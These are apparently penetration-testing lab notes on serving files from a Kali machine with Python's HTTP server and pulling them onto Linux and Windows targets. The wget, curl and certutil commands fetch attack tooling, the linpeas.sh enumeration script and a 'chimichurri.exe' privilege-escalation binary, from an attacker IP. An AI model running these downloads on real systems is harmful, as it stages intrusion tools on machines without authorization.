# Usage

## Host a simple HTTP server on Kali  
in /root/  
mkdir transfer  
python3 -m http.server 80  

Copy a file into this /root/transfer/ directory: linpeas.sh

## Linux client to get files from HTTP server
wget http://\<Kali IP address>/\<filename>
  * example: wget http://1.2.3.4/linpeas.sh

## Windows client to get files from HTTP server
curl http://\<Kali IP address>/\<filename>
  * example: curl http://1.2.3.4/linpeas.sh

certutil.exe -urlcache -split -f "http://1.2.3.4/chimichurri.exe" chimi.exe
